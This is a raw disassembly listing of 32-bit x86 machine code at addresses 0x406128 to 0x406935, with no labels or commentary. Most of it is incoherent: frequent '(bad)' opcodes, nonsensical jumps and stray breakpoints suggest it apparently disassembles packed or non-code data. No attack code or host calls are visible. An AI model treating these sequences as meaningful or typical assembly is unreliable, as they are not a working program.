  406128:	repnz add BYTE PTR [eax],al
  40612b:	int3   
  40612c:	cmp    edi,0x0
  40612f:	mov    DWORD PTR [ebp+0x50],eax
  406132:	push   0x0
  406134:	jmp    0x406157
  406136:	call   0xc36c08
  40613b:	inc    DWORD PTR [ebx+0x34ff0000]
  406141:	sbb    DWORD PTR [ebp+0x0],eax
  406144:	stc    
  406145:	scas   eax,DWORD PTR es:[edi]
  406146:	xor    edi,DWORD PTR [esi+0x50]
  406149:	add    BYTE PTR [eax],al
  40614b:	(bad)  
  40614c:	inc    DWORD PTR [eax]
  40614e:	add    bh,bh
  406150:	je     0x406126
  406152:	scas   al,BYTE PTR es:[edi]
  406153:	jmp    FWORD PTR [ecx-0xc41a501]
  406159:	(bad)  
  40615a:	dec    esp
  40615c:	inc    DWORD PTR [eax]
  40615e:	inc    DWORD PTR [eax]
  406160:	fwait
  406161:	pcmpgtb mm0,QWORD PTR [ebx-0x58bf0866]
  406168:	(bad)  
  406169:	inc    DWORD PTR [eax]
  40616b:	add    bh,bh
  40616d:	inc    DWORD PTR [eax]
  40616f:	add    ecx,0x6e
  406172:	inc    edx
  406173:	add    bl,dh
  406175:	xchg   BYTE PTR [ecx-0x33766ab0],al
  40617b:	add    BYTE PTR [eax],al
  40617d:	inc    DWORD PTR [eax]
  40617f:	push   DWORD PTR [eax+0x2f8349cb]
  406185:	(bad)  
  406186:	ficomp DWORD PTR [ebx-0x7d]
  406189:	add    BYTE PTR [eax],al
  40618b:	(bad)  
  40618c:	(bad)  
  40618d:	inc    DWORD PTR [eax]
  40618f:	add    BYTE PTR [esi-0x67],al
  406192:	add    DWORD PTR [eax],eax
  406194:	xor    al,0xa2
  406196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406197:	sub    al,0xe6
  406199:	add    bh,bh
  40619b:	inc    DWORD PTR [ebx-0x5c010000]
  4061a1:	jle    0x4061a1
  4061a3:	xor    esi,0xffffffde
  4061a6:	xor    BYTE PTR [ebx-0xf7],cl
  4061ac:	int3   
  4061ad:	inc    DWORD PTR [eax]
  4061af:	mov    DWORD PTR [ebp+0x398393c2],ecx
  4061b5:	leave  
  4061b6:	or     BYTE PTR [ebp+0x2f],ah
  4061b9:	int3   
  4061ba:	add    ah,cl
  4061bc:	mov    edi,edi
  4061be:	inc    DWORD PTR [eax]
  4061c0:	push   ss
  4061c1:	xlat   BYTE PTR ds:[ebx]
  4061c2:	inc    ebp
  4061c3:	add    bh,bh
  4061c5:	cmp    bl,bl
  4061c7:	pop    esi
  4061c8:	cmp    cl,ah
  4061ca:	inc    DWORD PTR [eax]
  4061cc:	add    DWORD PTR [ebx+0x3d780000],0x16
  4061d3:	or     DWORD PTR [eax],0xffffffdd
  4061d6:	inc    eax
  4061d7:	and    esi,DWORD PTR [ecx]
  4061d9:	add    BYTE PTR [eax],al
  4061db:	(bad)  
  4061dc:	(bad)  
  4061dd:	inc    DWORD PTR [eax]
  4061df:	add    bh,al
  4061e1:	inc    ebx
  4061e2:	js     0x4061e4
  4061e4:	jmp    0x40617a
  4061e6:	push   0xffffff89
  4061e8:	mov    edi,?
  4061ea:	mov    DWORD PTR [eax],eax
  4061ec:	add    BYTE PTR [eax],al
  4061ee:	add    DWORD PTR [eax],0xffffffd5
  4061f1:	(bad)  
  4061f2:	imul   eax,DWORD PTR [eax],0x4e
  4061f5:	xchg   BYTE PTR [eax+edx*2],ah
  4061f8:	xchg   ebx,eax
  4061f9:	add    DWORD PTR [eax],0x0
  4061fc:	inc    DWORD PTR [eax]
  4061fe:	inc    DWORD PTR [eax]
  406200:	int    0xf2
  406202:	mov    ch,0xff
  406204:	adc    al,0x5c
  406206:	outs   dx,DWORD PTR ds:[esi]
  406207:	xchg   edi,eax
  406208:	in     eax,dx
  406209:	add    bh,bh
  40620b:	(bad)  
  40620c:	inc    DWORD PTR [eax]
  40620e:	(bad)  
  40620f:	(bad)  
  406210:	jns    0x406285
  406212:	data16 (bad) 
  406214:	in     al,dx
  406215:	cs push ebp
  406217:	dec    ebp
  406218:	jl     0x40619d
  40621a:	mov    edi,edi
  40621c:	mov    esp,ecx
  40621e:	add    BYTE PTR [eax],al
  406220:	sbb    eax,0x3200f657
  406225:	sbb    dh,BYTE PTR [ecx]
  406227:	pop    ecx
  406228:	push   edx
  406229:	mov    edi,edi
  40622b:	add    bh,bh
  40622d:	(bad)  
  40622e:	inc    DWORD PTR [eax]
  406230:	mov    ds:0xd8ff80f0,al
  406235:	shl    ecx,1
  406237:	or     eax,0xff008376
  40623c:	inc    DWORD PTR [ebx+0x5e0000ff]
  406242:	scas   al,BYTE PTR es:[edi]
  406243:	push   DWORD PTR [edi]
  406245:	pop    esp
  406246:	cmc    
  406247:	into   
  406248:	fwait
  406249:	int3   
  40624a:	add    BYTE PTR [ebx-0x7cff007d],al
  406250:	xchg   ecx,eax
  406251:	mov    ch,0xc0
  406253:	int3   
  406254:	dec    esi
  406255:	(bad)  
  406256:	fsub   QWORD PTR [edx]
  406258:	cli    
  406259:	(bad)  
  40625a:	(bad)  
  40625b:	inc    DWORD PTR [eax]
  40625d:	add    bh,bh
  40625f:	jmp    DWORD PTR [esi+edi*4-0x5b]
  406263:	mov    DWORD PTR ds:0xb627b4ce,eax
  406269:	dec    DWORD PTR [ecx-0x7600007d]
  40626f:	add    BYTE PTR [edi+0x75002332],dl
  406275:	xor    eax,0xff6faa7d
  40627a:	mov    DWORD PTR [eax],eax
  40627c:	(bad)  
  40627d:	dec    esp
  40627f:	jmp    FWORD PTR [ebx-0x57]
  406282:	and    DWORD PTR [eax],eax
  406284:	ficomp WORD PTR [ecx-0xe61e73]
  40628a:	add    bh,bh
  40628c:	(bad)  
  40628d:	(bad)  
  40628e:	(bad)  
  40628f:	dec    DWORD PTR [edx+0x4b008cfd]
  406295:	not    BYTE PTR [esp+eax*4-0x5]
  406299:	inc    DWORD PTR [eax]
  40629b:	cmp    edi,0x0
  40629e:	add    bh,bh
  4062a0:	lock xor eax,0x34c3ff26
  4062a6:	xchg   BYTE PTR [edx],ah
  4062a8:	dec    edx
  4062a9:	(bad)  
  4062aa:	(bad)  
  4062ab:	dec    esp
  4062ad:	dec    DWORD PTR [ecx-0x60007f01]
  4062b3:	add    BYTE PTR [ecx+0x60b7a311],bh
  4062b9:	inc    DWORD PTR [eax]
  4062bb:	add    DWORD PTR [eax],0xffffff83
  4062be:	mov    edi,edi
  4062c0:	push   es
  4062c1:	inc    ecx
  4062c2:	iret   
  4062c3:	(bad)  
  4062c4:	in     al,dx
  4062c5:	sbb    BYTE PTR [eax],ah
  4062c7:	(bad)  [ebx+eax*4]
  4062ca:	cmp    edi,0x0
  4062cd:	int3   
  4062ce:	(bad)  
  4062cf:	(bad)  
  4062d0:	cmp    BYTE PTR [edx],dh
  4062d2:	std    
  4062d3:	sub    DWORD PTR [ebp+esi*4+0x37],0xfffffffa
  4062d8:	sbb    al,BYTE PTR [ebx-0xff0001]
  4062de:	add    bh,bh
  4062e0:	dec    ecx
  4062e1:	inc    edi
  4062e2:	and    eax,0x217c883
  4062e7:	out    0x6e,al
  4062e9:	add    DWORD PTR [eax],0xffffff89
  4062ec:	dec    esp
  4062ee:	add    ah,cl
  4062f0:	xor    bh,bh
  4062f2:	and    BYTE PTR [ebx+0x7a7f563a],al
  4062f8:	xor    bh,bh
  4062fa:	add    bh,bh
  4062fc:	dec    DWORD PTR [ecx-0x1c420100]
  406302:	sbb    eax,0x59ab2783
  406307:	repnz xchg ebp,eax
  406309:	add    BYTE PTR [ebx-0x1000000],al
  40630f:	call   FWORD PTR [edi+0x60002f2e]
  406315:	loopne 0x4062f0
  406317:	sbb    BYTE PTR [edx-0x7c0001],ah
  40631d:	add    bh,bh
  40631f:	(bad)  
  406320:	jg     0x4062e7
  406322:	add    DWORD PTR [eax-0x7c057700],0x7e
  406329:	retf   
  40632a:	push   DWORD PTR [esi-0xec0077]
  406330:	mov    esi,0xffecffb0
  406335:	adc    DWORD PTR [edx-0x1],0x49
  406339:	mov    ch,0xff
  40633b:	ret    0xff89
  40633e:	add    al,BYTE PTR [eax]
  406340:	ret    
  406341:	adc    eax,DWORD PTR [eax]
  406343:	mov    dh,0xff
  406345:	mov    DWORD PTR [eax],ecx
  406347:	xor    DWORD PTR [esi-0x19],0x0
  40634b:	rol    BYTE PTR [eax],1
  40634d:	add    BYTE PTR [edi-0x1],dh
  406350:	push   cs
  406351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406352:	call   eax
  406354:	inc    DWORD PTR [eax]
  406356:	and    al,BYTE PTR [ebx+0x66004e6c]
  40635c:	(bad)  
  40635d:	jmp    DWORD PTR [edi-0x7d]
  406360:	add    edx,DWORD PTR [esi]
  406362:	cmp    DWORD PTR [edx-0x77],0xffffffff
  406366:	xchg   ebx,eax
  406367:	add    BYTE PTR [ecx],cl
  406369:	repz call DWORD PTR [edx-0x34]
  40636d:	add    BYTE PTR [edx-0x77ad00],dl
  406373:	(bad)  
  406375:	jmp    FWORD PTR [esp+ecx*8+0x100078ee]
  40637c:	(bad)  
  40637d:	call   eax
  40637f:	int3   
  406380:	and    eax,0xff5200e3
  406385:	push   ebx
  406387:	add    BYTE PTR [ebx-0x1000b0],al
  40638d:	int3   
  40638e:	jno    0x406390
  406390:	sar    DWORD PTR [edx],cl
  406392:	add    BYTE PTR [eax+eax*1],ah
  406395:	sbb    DWORD PTR [ebx-0xc73e00],0xffffffb1
  40639c:	(bad)  
  40639d:	(bad)  
  40639e:	inc    DWORD PTR [ebx-0x16007d07]
  4063a4:	(bad)  
  4063a5:	jmp    FWORD PTR [ebx]
  4063a7:	mov    ebx,esp
  4063a9:	pop    ebp
  4063aa:	int3   
  4063ab:	inc    ebp
  4063ac:	(bad)  
  4063ad:	jmp    FWORD PTR [esi]
  4063af:	push   DWORD PTR [edx-0x53]
  4063b2:	dec    DWORD PTR [esi]
  4063b4:	(bad)  
  4063b5:	inc    DWORD PTR [eax]
  4063b7:	(bad)  
  4063b8:	jle    0x406432
  4063ba:	add    cl,ah
  4063bc:	dec    esp
  4063be:	add    al,0x83
  4063c0:	pop    ebx
  4063c1:	fadd   DWORD PTR [ebx-0x29007c5b]
  4063c7:	jmp    FWORD PTR [eax]
  4063c9:	fadd   DWORD PTR [ebx+0x10ffff39]
  4063cf:	mov    DWORD PTR [edi+0x8a00d6],ebp
  4063d5:	jmp    DWORD PTR [eax-0x1]
  4063d8:	xor    BYTE PTR [eax-0x76002200],0x89
  4063df:	(bad)  
  4063e0:	cmp    cl,ah
  4063e2:	inc    DWORD PTR [eax-0x77]
  4063e5:	dec    DWORD PTR [ebx-0x2caa01]
  4063eb:	or     eax,DWORD PTR [ebx+0x18ff0b83]
  4063f1:	loopne 0x4063f3
  4063f3:	call   0x701c:0xff558983
  4063fa:	(bad)  
  4063fb:	js     0x406386
  4063fd:	(bad)  
  4063fe:	(bad)  
  406400:	push   ds
  406401:	adc    DWORD PTR [ecx+0x73ffff54],ecx
  406407:	add    dh,bh
  406409:	xlat   BYTE PTR ds:[ebx]
  40640a:	add    dl,ah
  40640c:	add    bh,bh
  40640e:	push   ebx
  40640f:	inc    DWORD PTR [eax-0x7c680096]
  406415:	jmp    DWORD PTR [ecx-0x33472501]
  40641b:	inc    eax
  40641c:	int3   
  40641d:	inc    esp
  40641f:	add    ch,dl
  406421:	xrelease mov DWORD PTR [ebp+0x3200ff],ebx
  406428:	fnsave [ebx]
  40642a:	or     DWORD PTR [ebx],0x0
  40642d:	xor    DWORD PTR [eax-0x801d00],0x3a
  406434:	inc    DWORD PTR [eax]
  406436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406437:	jmp    DWORD PTR [eax-0x2d]
  40643a:	add    BYTE PTR [edi+0x32ff00],ch
  406440:	jmp    0x406448
  406442:	dec    DWORD PTR [ecx]
  406444:	mov    DWORD PTR [eax],eax
  406446:	add    eax,0xff73b083
  40644b:	test   eax,0xfff38300
  406450:	cmp    BYTE PTR [eax-0xd901],dl
  406456:	ins    DWORD PTR es:[edi],dx
  406457:	int3   
  406458:	into   
  406459:	pushf  
  40645a:	add    BYTE PTR [ebp-0x1],dl
  40645d:	int3   
  40645e:	adc    eax,0xffc9de00
  406463:	add    al,0xff
  406465:	add    bl,bl
  406467:	add    BYTE PTR [ecx],ah
  406469:	dec    ebp
  40646a:	add    BYTE PTR [edi+0xd9ff00],bl
  406470:	enter  0xff75,0xb6
  406474:	mov    DWORD PTR [eax],eax
  406476:	retf   
  406477:	int3   
  406478:	aam    0xbb
  40647a:	add    al,bl
  40647c:	add    BYTE PTR [ebx+0x3caf00f5],al
  406482:	int3   
  406483:	sub    edi,edi
  406485:	push   edi
  406487:	(bad)  
  406488:	std    
  406489:	les    eax,FWORD PTR [eax]
  40648b:	das    
  40648c:	cmp    edi,0xffffff92
  40648f:	inc    DWORD PTR [edx-0x22]
  406492:	push   DWORD PTR [ebx+0x4accff]
  406498:	or     DWORD PTR gs:[ebx+0x4aff0097],eax
  40649f:	int3   
  4064a0:	repz push cs
  4064a2:	add    BYTE PTR [eax-0x1],dl
  4064a5:	add    dh,bh
  4064a7:	add    DWORD PTR [edi],0x25
  4064aa:	add    BYTE PTR [edx-0x7c1aff7d],ah
  4064b0:	and    ch,cl
  4064b2:	add    DWORD PTR [eax],0xffffffff
  4064b5:	xor    DWORD PTR [eax],0xffffffff
  4064b8:	in     al,0xbc
  4064ba:	sub    DWORD PTR [ebp-0x7d],0x0
  4064be:	jns    0x4064bf
  4064c0:	mov    bh,0x69
  4064c2:	push   DWORD PTR [esi-0x1]
  4064c5:	add    BYTE PTR [ebp+0x0],bl
  4064c8:	push   cs
  4064c9:	repz adc DWORD PTR [ebp+0x0],0x0
  4064ce:	jno    0x4064d0
  4064d0:	lock adc bh,bh
  4064d3:	sbb    cl,ah
  4064d5:	add    BYTE PTR [edi+edi*8-0x4c00b572],bl
  4064dc:	add    BYTE PTR [ebx+0x32f6002a],al
  4064e2:	inc    DWORD PTR [edx-0x338bff34]
  4064e8:	(bad)  
  4064e9:	push   edi
  4064ea:	add    BYTE PTR [esi],bh
  4064ec:	add    BYTE PTR [eax],al
  4064ee:	sar    bh,cl
  4064f0:	jecxz  0x406511
  4064f2:	add    dh,bl
  4064f4:	add    DWORD PTR [ebx-0x52d10049],0x0
  4064fb:	xchg   edx,eax
  4064fc:	inc    DWORD PTR [eax]
  4064fe:	push   0xffeb78ff
  406503:	fild   WORD PTR [eax]
  406505:	mov    DWORD PTR [ecx],ebp
  406507:	call   edi
  406509:	mov    al,ds:0x83ff3000
  40650e:	adc    bh,bh
  406510:	das    
  406511:	fadd   QWORD PTR [eax]
  406513:	(bad)  
  406514:	inc    DWORD PTR [eax]
  406516:	mov    ch,0xff
  406518:	or     edx,eax
  40651a:	mov    edx,esi
  40651c:	add    BYTE PTR [ebx-0x5ef70032],al
  406522:	jmp    FWORD PTR [eax+eax*1-0x77]
  406526:	ds add ch,ch
  406529:	adc    al,0xcc
  40652b:	pop    edx
  40652c:	int3   
  40652d:	call   FWORD PTR [ecx-0x1]
  406530:	and    BYTE PTR [ebx+0x0],ah
  406533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406534:	add    bh,bh
  406536:	jbe    0x406537
  406538:	sbb    bl,al
  40653a:	dec    DWORD PTR [edi-0x803377]
  406540:	cmp    ah,BYTE PTR [ebp+0x0]
  406543:	add    eax,0xd2ff83
  406548:	nop
  406549:	xor    edi,edi
  40654b:	mov    ch,0x83
  40654d:	add    DWORD PTR [edi+0x2994ff],0x29
  406554:	add    BYTE PTR [eax],al
  406556:	call   0x4b9e5b
  40655b:	xlat   BYTE PTR ds:[ebx]
  40655c:	(bad)  
  40655d:	call   FWORD PTR [edi+0x0]
  406560:	mov    ah,0x2d
  406562:	add    BYTE PTR [edx],ch
  406564:	mov    edi,edi
  406566:	inc    ebp
  406567:	jmp    FWORD PTR [eax+0x18]
  40656a:	add    BYTE PTR [edx],dl
  40656c:	add    DWORD PTR [ebx+0x5751ffdc],0xffffffff
  406573:	jge    0x406575
  406575:	add    dl,bl
  406577:	dec    DWORD PTR [ecx]
  406579:	push   cs
  40657a:	add    BYTE PTR [eax],dh
  40657c:	add    BYTE PTR [ebx+0x5289ff75],al
  406582:	dec    DWORD PTR [edx+0xfffff]
  406588:	xor    ecx,esi
  40658a:	int3   
  40658b:	mov    al,0xff
  40658d:	jmp    FWORD PTR [ecx+0x5f39ff]
  406593:	push   0x91ffff
  406598:	xor    bl,BYTE PTR [ecx+0x0]
  40659b:	adc    DWORD PTR [ecx+0x41ccc7ff],ecx
  4065a1:	out    dx,eax
  4065a2:	add    al,dh
  4065a4:	inc    DWORD PTR [eax]
  4065a6:	push   0xac1500
  4065ab:	sub    edi,edi
  4065ad:	inc    ebx
  4065af:	xor    DWORD PTR [esi],0x46
  4065b2:	(bad)  
  4065b3:	cli    
  4065b4:	add    bh,bh
  4065b6:	into   
  4065b7:	(bad)  
  4065b8:	jmp    0x8341658b
  4065bd:	adc    DWORD PTR [edx-0x7c0ede7d],0xffffffd8
  4065c4:	(bad)  
  4065c5:	(bad)  
  4065c6:	cmp    al,0xcc
  4065c8:	inc    ecx
  4065c9:	cmp    al,BYTE PTR [ebx+0x3ff0006]
  4065cf:	add    ch,bh
  4065d1:	xor    al,0xff
  4065d3:	add    DWORD PTR [ebx+0x3bffe100],0x1e
  4065da:	dec    DWORD PTR [eax-0x7c7c0001]
  4065e0:	jo     0x4065d3
  4065e2:	add    BYTE PTR [esi+0x0],dh
  4065e5:	int3   
  4065e6:	inc    ebx
  4065e7:	add    BYTE PTR ds:0x52ff43,ch
  4065ed:	mov    DWORD PTR [ebx+0x0],edx
  4065f0:	push   eax
  4065f1:	in     al,0x83
  4065f3:	dec    ebx
  4065f4:	int3   
  4065f5:	and    DWORD PTR [edi+edi*8],0xffffffb6
  4065f9:	xor    eax,0xff2eff
  4065fe:	ret    
  4065ff:	and    DWORD PTR [edx-0x8a00e3],0x0
  406606:	les    eax,FWORD PTR [ebx-0x59ffac32]
  40660c:	add    BYTE PTR [eax],al
  40660e:	(bad)  
  406610:	dec    ebx
  406611:	aad    0x0
  406613:	idiv   edi
  406615:	push   esp
  406617:	call   FWORD PTR [edx]
  406619:	aam    0x0
  40661b:	cmp    al,BYTE PTR [eax]
  40661d:	call   ecx
  40661f:	jmp    DWORD PTR [eax+ebp*4-0x1]
  406623:	push   0xffffffff
  406625:	add    BYTE PTR [ebx-0x921c01],dh
  40662b:	pop    edx
  40662c:	dec    esp
  40662e:	jne    0x40662f
  406630:	stos   BYTE PTR es:[edi],al
  406631:	int3   
  406632:	mov    DWORD PTR [esi-0x76387c7d],ebp
  406638:	jp     0x406660
  40663a:	jmp    DWORD PTR [esp+ecx*8-0x8003934]
  406641:	mov    esp,0xcc8390ff
  406646:	in     eax,dx
  406647:	push   DWORD PTR [edx]
  406649:	sar    edi,0x24
  40664c:	int3   
  40664d:	jmp    DWORD PTR [esi]
  40664f:	(bad)  
  406650:	cmp    ecx,DWORD PTR ds:0x838358ff
  406656:	push   ebx
  406657:	add    BYTE PTR [eax-0xc733d7],dl
  40665d:	mov    DWORD PTR [eax-0x7d],eax
  406660:	je     0x40660f
  406662:	add    ch,bh
  406664:	(bad)  
  406665:	(bad)  
  406666:	cmp    cl,ah
  406668:	ret    
  406669:	jle    0x40666a
  40666b:	sbb    bh,bh
  40666d:	jmp    FWORD PTR [ecx-0x7d]
  406670:	push   edi
  406671:	add    DWORD PTR [ebx-0x693300f0],eax
  406677:	add    dl,bl
  406679:	leave  
  40667a:	jmp    DWORD PTR [eax]
  40667c:	add    BYTE PTR [ebx-0x39ceffe2],al
  406682:	add    BYTE PTR [edx-0x1],ah
  406685:	push   DWORD PTR [eax+eax*1+0x7c00958e]
  40668c:	(bad)  
  40668d:	call   DWORD PTR [ecx]
  40668f:	(bad)  
  406690:	mov    edx,0xffe5ffce
  406695:	add    BYTE PTR [ecx+ecx*4-0x607c04aa],bl
  40669c:	add    BYTE PTR [eax],al
  40669e:	push   0xff016ecc
  4066a3:	xchg   esp,ecx
  4066a5:	jmp    esp
  4066a7:	int3   
  4066a8:	arpl   WORD PTR [ebx+eax*4-0x27],bx
  4066ac:	(bad)  
  4066ad:	(bad)  
  4066ae:	(bad)  
  4066b0:	out    0xd5,eax
  4066b2:	xor    DWORD PTR [edi],0x0
  4066b5:	int3   
  4066b6:	sub    edi,edi
  4066b8:	jno    0x40663a
  4066ba:	call   FWORD PTR [ebx-0x1]
  4066bd:	add    BYTE PTR ds:0xffeda100,cl
  4066c3:	mov    edi,edi
  4066c5:	add    BYTE PTR [ebp-0x1],al
  4066c8:	scas   al,BYTE PTR es:[edi]
  4066c9:	and    al,0x0
  4066cb:	pop    esp
  4066cc:	add    bh,bh
  4066ce:	cmp    DWORD PTR [ecx+0x4c83c8c2],ecx
  4066d4:	inc    DWORD PTR [eax]
  4066d6:	stos   BYTE PTR es:[edi],al
  4066d7:	cmp    ebx,0xffffffc1
  4066da:	call   FWORD PTR [esp+ecx*8]
  4066dd:	add    BYTE PTR [ebp+0xfc1800],ah
  4066e3:	pop    ebp
  4066e4:	add    BYTE PTR [eax],al
  4066e6:	out    0xff,al
  4066e8:	arpl   WORD PTR [edi],di
  4066ea:	jmp    FWORD PTR [edx+0x0]
  4066ed:	dec    DWORD PTR [edi+edi*8]
  4066f0:	pusha  
  4066f1:	mov    ds:0xff6cff,al
  4066f6:	jne    0x4066f7
  4066f8:	sahf   
  4066f9:	pop    edx
  4066fa:	dec    DWORD PTR [edi]
  4066fc:	add    DWORD PTR [eax],0x36
  4066ff:	add    dl,ah
  406701:	jge    0x406686
  406703:	jns    0x406704
  406705:	add    BYTE PTR [edi+edi*8+0x6c],bl
  406709:	aaa    
  40670a:	int3   
  40670b:	stos   DWORD PTR es:[edi],eax
  40670c:	inc    DWORD PTR [ebx+0x7dc4ccba]
  406712:	jmp    DWORD PTR [esi-0x1]
  406715:	add    BYTE PTR [eax-0x1],bl
  406718:	loopne 0x4066aa
  40671a:	(bad)  
  40671b:	std    
  40671c:	or     DWORD PTR [ecx+0x38fcffac],0xffffffcc
  406723:	(bad)  
  406725:	mov    esi,eax
  406727:	inc    DWORD PTR [eax-0x33c300b8]
  40672d:	add    BYTE PTR [ebx+0x0],cl
  406730:	xchg   esi,eax
  406731:	add    bh,bh
  406733:	mov    ds:0x8390ff00,al
  406738:	dec    ebx
  406739:	aad    0xff
  40673b:	pop    esi
  40673c:	add    BYTE PTR [eax],al
  40673e:	adc    DWORD PTR [ecx+0x5fff9421],ecx
  406744:	(bad)  
  406745:	call   DWORD PTR [ebp+0x0]
  406748:	into   
  406749:	stos   BYTE PTR es:[edi],al
  40674a:	call   FWORD PTR [esi-0x1]
  40674d:	dec    DWORD PTR [esi]
  40674f:	jmp    FWORD PTR [edx]
  406751:	add    BYTE PTR [eax],0xd4
  406754:	add    ah,cl
  406756:	popa   
  406757:	dec    DWORD PTR [eax+0x15]
  40675a:	and    DWORD PTR [esp+ecx*8-0x1],0xffffffca
  40675f:	int3   
  406760:	cmp    eax,0xff0900e4
  406765:	(bad)  
  406766:	cld    
  406767:	inc    ecx
  406769:	sahf   
  40676a:	(bad)  
  40676b:	aas    
  40676c:	add    bh,bh
  40676e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40676f:	add    bl,bh
  406771:	loope  0x406772
  406773:	mov    esi,0xff04ff00
  406778:	sbb    ebx,DWORD PTR [eax+eax*1-0x23]
  40677c:	add    bh,bh
  40677e:	lods   al,BYTE PTR ds:[esi]
  40677f:	jmp    DWORD PTR [eax-0x39]
  406782:	int3   
  406783:	nop
  406784:	or     DWORD PTR [ecx-0x70a533d7],0x0
  40678b:	mov    al,BYTE PTR [eax]
  40678d:	cmp    DWORD PTR [edi+edi*8+0x7f],0xffffffd9
  406792:	jmp    DWORD PTR [ecx-0x7d]
  406795:	add    BYTE PTR [eax+0x0],ch
  406798:	retf   0x8344
  40679b:	arpl   di,di
  40679d:	call   DWORD PTR [edi+0x0]
  4067a0:	inc    ah
  4067a2:	call   eax
  4067a4:	add    BYTE PTR [eax],al
  4067a6:	(bad)  
  4067a7:	jmp    FWORD PTR [edx-0x7c8e7660]
  4067ad:	mov    DWORD PTR [edi+0x585400],esi
  4067b3:	cmp    edi,edi
  4067b5:	push   ebp
  4067b7:	adc    edx,0xffffffb7
  4067ba:	add    BYTE PTR [edi-0xa1ff01],cl
  4067c0:	ins    DWORD PTR es:[edi],dx
  4067c1:	pop    es
  4067c2:	add    BYTE PTR [esi-0x1],bh
  4067c5:	jmp    edx
  4067c7:	add    BYTE PTR [edx+0x48],ch
  4067ca:	dec    DWORD PTR [eax+0x4a00ff]
  4067d0:	iret   
  4067d1:	mov    al,ds:0xff89c300
  4067d6:	inc    ebx
  4067d7:	add    DWORD PTR [ebp-0x917686],0xffffffcc
  4067de:	jbe    0x406763
  4067e0:	in     al,0x37
  4067e2:	inc    DWORD PTR [esi]
  4067e4:	(bad)  
  4067e5:	call   DWORD PTR [eax]
  4067e7:	xor    edi,0xffffffc9
  4067ea:	call   DWORD PTR [ecx-0x7d]
  4067ed:	dec    esi
  4067ef:	mov    ecx,eax
  4067f1:	mov    bx,sp
  4067f4:	inc    DWORD PTR [eax]
  4067f6:	and    edi,edi
  4067f8:	mov    eax,DWORD PTR [eax-0x1]
  4067fb:	in     eax,0x83
  4067fd:	and    DWORD PTR [esi+0x9018ff],0xffffffb1
  406804:	inc    DWORD PTR [ebx+0x5c570073]
  40680a:	add    BYTE PTR [ebx-0x7617ff7d],dh
  406810:	(bad)  
  406811:	fadd   DWORD PTR [eax]
  406813:	sahf   
  406814:	(bad)  
  406815:	dec    DWORD PTR [ebx-0x951d01]
  40681b:	fld    QWORD PTR [eax]
  40681d:	(bad)  
  40681e:	std    
  40681f:	(bad)  
  406820:	mov    ebp,0x7300c4
  406825:	call   DWORD PTR [esp+ecx*8]
  406828:	lea    ebp,[edx]
  40682a:	int3   
  40682b:	jnp    0x4067f9
  40682d:	inc    DWORD PTR [eax]
  40682f:	push   DWORD PTR [ebp-0x17]
  406832:	jmp    FWORD PTR [esi-0x1]
  406835:	add    BYTE PTR [ebx+eax*4],cl
  406838:	scas   al,BYTE PTR es:[edi]
  406839:	xor    edi,edi
  40683b:	pop    ebp
  40683c:	add    bh,bh
  40683e:	xchg   edx,eax
  40683f:	push   DWORD PTR [ebx]
  406841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406842:	(bad)  
  406843:	jmp    0x204e:0xff0affff
  40684a:	cmp    DWORD PTR [ecx-0x7e0001],0x3e
  406851:	add    edi,edi
  406853:	push   ds
  406854:	cmp    edi,0x38
  406857:	and    DWORD PTR [ecx],0xffffffcb
  40685a:	call   DWORD PTR [esi+0x0]
  40685d:	add    BYTE PTR [edx+0x0],bl
  406860:	fwait
  406861:	lahf   
  406862:	call   FWORD PTR [edi+0xd2ffff]
  406868:	cdq    
  406869:	retf   0x94ff
  40686c:	mov    edi,edi
  40686e:	mov    BYTE PTR [ebx-0x69004f02],0xff
  406875:	add    BYTE PTR [eax],bl
  406877:	jmp    FWORD PTR [ebx]
  406879:	mov    ch,0x0
  40687b:	jp     0x40687c
  40687d:	push   DWORD PTR [eax-0x76913101]
  406883:	jmp    0xb570:0xff230000
  40688a:	dec    DWORD PTR [edx]
  40688c:	(bad)  
  40688d:	call   FWORD PTR [edx]
  40688f:	add    BYTE PTR [ecx-0x57],bh
  406892:	(bad)  
  406893:	jns    0x406894
  406895:	push   DWORD PTR [edx-0x7c56b134]
  40689b:	out    dx,al
  40689c:	int3   
  40689d:	inc    DWORD PTR ds:0xe52c89
  4068a3:	xor    bh,bh
  4068a5:	mov    DWORD PTR [eax+eax*1-0x7a001191],edx
  4068ac:	add    BYTE PTR [ebx+0x48308925],al
  4068b2:	push   DWORD PTR [ecx-0x34]
  4068b5:	add    DWORD PTR [ebx-0x1],0x74
  4068b9:	jb     0x4068bb
  4068bb:	or     BYTE PTR [ecx-0x6a003800],0x3e
  4068c2:	jmp    FWORD PTR [edx]
  4068c4:	add    bh,bh
  4068c6:	sub    al,BYTE PTR [eax]
  4068c8:	jge    0x40687e
  4068ca:	dec    esp
  4068cc:	mov    DWORD PTR [ebx+0x277d00bb],eax
  4068d2:	add    BYTE PTR [edx],ah
  4068d4:	inc    DWORD PTR [ebx-0x2fb30002]
  4068da:	xor    edi,0xffffffff
  4068dd:	push   DWORD PTR [ebx]
  4068df:	call   FWORD PTR [ebp+0xad0077]
  4068e5:	(bad)  
  4068e6:	fld    QWORD PTR [eax]
  4068e8:	arpl   WORD PTR [edi+edi*8],dx
  4068eb:	add    BYTE PTR [eax],al
  4068ed:	dec    esi
  4068ef:	add    al,al
  4068f1:	(bad)  
  4068f2:	jmp    DWORD PTR [ebp-0x7c587c34]
  4068f8:	(bad)  
  4068f9:	addr16 int3 
  4068fb:	cld    
  4068fc:	mov    edi,edi
  4068fe:	test   BYTE PTR [eax],0x6e
  406901:	fmul   st,st(4)
  406903:	xor    al,0xff
  406905:	add    bl,bh
  406907:	add    BYTE PTR [ecx-0xa900ea],al
  40690d:	mov    DWORD PTR [ecx+0x1888ff],edx
  406913:	cmp    eax,0xff3d00cc
  406918:	ror    dl,cl
  40691a:	add    BYTE PTR [esi+0xf3ff00],ah
  406920:	pop    edx
  406921:	imul   eax,DWORD PTR [eax],0xf08989d8
  406927:	(bad)  
  406928:	cmp    dl,BYTE PTR [edi+edi*8]
  40692b:	mov    dl,0xff
  40692d:	add    BYTE PTR [eax+eax*1-0xb],ch
  406931:	push   edx
  406932:	int3   
  406933:	sub    edi,edi
  406935:	add    BYTE PTR [ecx],bl
